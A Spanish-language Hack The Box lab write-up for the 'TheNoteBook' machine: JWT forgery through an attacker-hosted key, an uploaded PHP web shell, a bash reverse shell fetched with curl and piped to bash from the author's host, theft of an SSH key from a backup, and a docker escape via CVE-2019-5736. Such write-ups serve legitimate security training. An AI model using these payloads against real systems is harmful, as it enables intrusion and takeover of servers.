---
title: "TheNoteBook - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/TheNoteBook/data/TheNoteBook.png?raw=true"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - JSON
  - Doker
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/data/TheNoteBookHTB.png">
</p>

La máquina **TheNoteBook** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **medio** una calificación en el rank de 4.6, **12347 USER OWNS** y **10865 SYSTEM OWNS** con la ip **10.10.10.230** y un sistema operativo **Linux**.

## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.230]** utilizando los parámetros:
  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/scanPorts.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPorts**, vemos que los puertos que destacaron en este caso fueron **22 y 80**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/Ports.png">
  </p>

  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/PortServ.png">
  </p>

  Como solo hay dos puertos abierto yo enumere el servicio **http** ya que no contaba con credenciales para acceder por el puerto **22**. Entrando a la web puedo ver que existe una apartado de **login y register**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/web.png">
  </p>


  Al entrar al apartado de **register** y crear una cuenta no se puede apreciar mucho a la hora de entrar a la web, podemos crear notas y ya es todo lo que se puede hacer con la web por lo tanto intercepte una sesión con burpsuite y puede ver que la **cookie** de sesión que se genera es un formato **JSON Web Token**

  <div align="center">
  <table class="center"><tr>
  <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/web1.png">
  <div class="caption" >Panel de Registro.</div></center></td>
  <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/web2.png">
  <div class="caption">Web por Defecto.</div></center></td>
  </tr></table>
  </div>
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/token.png">
  </p>

  Este token lo podemos decodear en la pagina [jwp.io](https://jwt.io/).

  Al decodear el token se puede ver un apartado muy interesante el cual es **header** el cual lo que hace es llamar a una url en localhost por el puerto **7070** a un archivo **privatekey.key**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/tokenA.png">
  </p>

  Y también se puede ver que en el apartado de **PAYLOAD** del mismo token existe un apartado **"admin_cap"** el cual esta seteado a **0**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/tokenB.png">
  </p>

## Lateral Movement
  Teniendo estos datos en mente podemos generar nuestro token el cual tenga instrucciones para crear una cuenta con capacidad de admin.

  Para hacer esto hay que crear una llave privadas en **RSA** para esto se pueden hacer con la herramienta **ssh-keygen** o **openssl** esto se haría ingresando la siguiente sentencia de comandos:

  ```bash
  openssl genrsa -out privateKey.key 2048
  ```

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/scan/tokenG.png">
  </p>

  Una vez que se tenemos las keys modificare el **header** del token para que apunte a un **server http** que levantare con **python** para que tome la **private key** desde mi equipo y no el del server.

  También seteare la variable "**admin_cap**" a **1** e ingresando las **private key** en la web de jwt.io para poder generar el nuevo token.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/tokenM.png">
  </p>

  Ya teniendo el nuevo token desde el mismo navegador podemos modificar el token yéndonos a **inpeccionar** y en el apartado de **almacenamiento** se puede ver el token en el apartado de **auth**.

  Este campo lo modificare con el nuevo token y al recargar la pagina se puede ver que se agrega a la side bar el campo **admin panel**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/1.png">
  </p>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/2.png">
  </p>

  Se puede ver que a la hora se acceder a cualquier apartado en la web se ve reflejado en el **servidor http** que monte con **python** la pagina hace una petición a **privKey.key** por lo que es importe mantener este servicio activo para que nuestro token siga siendo funcional.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/3.png">
  </p>


  Ahora que tenemos la capacidad de ser admin en la pagina podemos enumerar mas y si vamos al **Admin Panel** tenemos la capacidad de subir archivos.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/upload.png">
  </p>

  Si entramos a esté apartado podemos ver la siguiente interfaz.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/upload2.png">
  </p>

  Yo creare un archivo **php** el cuan tenga el siguiente contenido.

  ```python
<?php
       $cmdC = $_GET['cmd'];
       echo "<pre>" . system($cmdC) ."</pre>";
?>

  ```

  Al subirlo puedo ver que la web me regresa un nombre del archivo que párese ser el nombre con el que se guardo en la web.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/cmd.png">
  </p>

  Si voy a ese archivo directamente desde la url puedo ver que la pagina me aparece en blanco pero no sale error de que el recurso no exista.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/webC.png">
  </p>

  Así que recordando que el **php** recibe un parámetro **cmd** por **GET** y lo ejecuta con **system** que le paso a cmd la intruccion de ejecutar **whoami** y como se aprecia en la imagen la web me responde con un **www-data**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/webW.png">
  </p>

 Viendo que tengo capacidad de ejecutar comando en la maquina buscare la forma de acceder al equipo, aprovechando que el equipo tiene **curl** y aprovechando el servicio http que ya tenia montado creare un archivo bash con el siguiente contenido.


 ```bash
  #!/bin/bash
  bash -i >& /dev/tcp/10.10.15.125/443 0>&1
 ```
 Ya teniendo el archivo creado y puesto en escucha por el puerto 443 con **nc** en la web ingresare lo siguiente.

 ```bash
10.10.10.230/[File Name].php?cmd=curl http://10.10.15.125:7070/winshell.sh|bash
 ```
 Y al ingresar esto se puede ver como en mi consola la web hace la peticion a **"winsehll.sh"** y me otorga la shell al interpretar el contenido del archivo y pipearlo con **bash**

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/shell.png">
 </p>

## Privilege escalation - Noah

 Enumerando el sistema puedo ver que el la ruta **/var/backups** existe un recurso llamado **home.tar.gz** el cual pude transferir a mi equipo cifrandolo en base64.

 ```
 #Victim Machin
 ~$ base64 home.tar.gz | tr -d "\n"

 #Host Machine
 ~# echo "hash" | base46 -d > home.tar.gz

 ```

 Ya en mi equipo comparo el md5 de los archivos y veo que son los mismo asegurando así la integridad el archivo.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/home.png">
 </p>

 Al descomprimir el archivo **home** me generar un sistema de carpetas y archivos el cual aparenta ser la carpeta personal del usuario **noah** y en este sistema de archivos se puede ver que existe un **id_rsa**.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/rsa.png">
 </p>


 Viendo que cuento con unas credenciales para **ssh** puedo usarlas para entrar como el usuario **noah**.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/ssh.png">
 </p>

 Y efectivamente las credenciales son validas para entrar por **ssh** como el usuario **noah**.

## Privilege escalation - root

Enumerando los permisos que cuenta el usuario **noah** se puede observar que cuenta con la capacidad de ejecutar con sudo sin proporcionar contraseña el siguiente comando.


```bash
noah@thenotebook:~$ whoami
noah
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
  (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Algo que se puede hacer es ejecutar ```sudo /usr/bin/docker exec -it webapp-dev01 bash``` el cual nos otorgara una shell en el conteenedor existente pero dentro de este contenedor no existe nada con la cual podamos escalar privilegios.

Viendo la versión de **docker** y buscando vulnerabilidades existentes podemos llegar a una con el CVE: **CVE-2019-5736**.

Existe un **[PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)** en github el cual use para poder escapar del contenedor.

Para poder ejecutar el **PoC** es necesario clonar el repositorio y compilar el **main.go** pero antes modificar el **PAYLOAD**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/PocP.png">
</p>

En este caso yo pondré que le otorgue permisos **SUID** a la **/bin/bash**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/Poc1.png">
</p>


Ya teniendo esto compilo el main con ```go build -ldflag "-x -w" main.go```. Ya teniendo el binario compilado lo tenemos que pasar a el contenedor y para esto entrare con una bash al contenedor y con wget me descargare el binario pero previamente montare un servidor http con python.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/Poc2.png">
</p>

Una vez que ya transferir el binario tengo que ejecutarlo y entrar una vez mas por **ssh** para en otra ventana aparte para ejecutar el el comando con sudo pero ahora ingresando una **/bin/sh**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/TheNoteBook/intrusion/Poc3.png">
</p>

Y como se puede observar podemos ejecutar comando como root y de este modo otorgándole permisos SUID a la **/bin/bash** y así obteniendo una shell como **root**
